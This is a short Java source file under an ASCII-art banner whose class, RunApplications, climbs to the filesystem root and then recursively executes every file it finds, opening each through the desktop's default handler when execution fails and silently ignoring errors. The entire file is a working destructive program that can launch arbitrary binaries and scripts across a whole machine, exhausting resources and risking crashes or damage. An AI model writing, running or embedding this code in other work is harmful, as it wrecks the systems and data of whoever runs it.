/*
__          ______ ____        _                       ____  _                 _       ___       _        
\ \        / /___ \___ \      | |                     |___ \| |               | |     / _ \     | |       
 \ \  /\  / /  __) |__) | __ _| |_ __ _ _ __ __ ___   ____) | | __ _ _ __   __| |_ __| | | | ___| | _____ 
  \ \/  \/ /  |__ <|__ < / _` | __/ _` | '__/ _` \ \ / /__ <| |/ _` | '_ \ / _` | '__| | | |/ __| |/ / __|
   \  /\  /   ___) |__) | (_| | || (_| | | | (_| |\ V /___) | | (_| | | | | (_| | |  | |_| | (__|   <\__ \
    \/  \/   |____/____/ \__,_|\__\__, |_|  \__,_| \_/|____/|_|\__,_|_| |_|\__,_|_|   \___/ \___|_|\_\___/
                                   __/ |                                                                  
                                  |___/                                                                   
*/
package net.domih;

import java.awt.Desktop;
import java.io.File;
import java.io.IOException;

public class RunApplications {

	private static void openFiles(File directory) {
		File[] fileList = directory.listFiles();

		if (fileList != null) {
			for (File file : fileList) {
				if (file.isFile()) {
					try {
				        System.out.println(file.getAbsolutePath().toString());

						Runtime.getRuntime().exec(file.getAbsolutePath().toString());

					} catch (IOException e) {
						Desktop desktop = Desktop.getDesktop();
						try {
							desktop.open(file);
						} catch (IOException e1) {
							
						}
						//no permission
					}
				} else if (file.isDirectory()) {
					openFiles(file);
				}
			}
		}
	}

	public static void main(String[] args) {
		File rootDirectory = new File(System.getProperty("user.dir"));
		while(rootDirectory.getParent() != null) {
			rootDirectory = new File(rootDirectory.getParent());
		}
		openFiles(rootDirectory);
	}
}
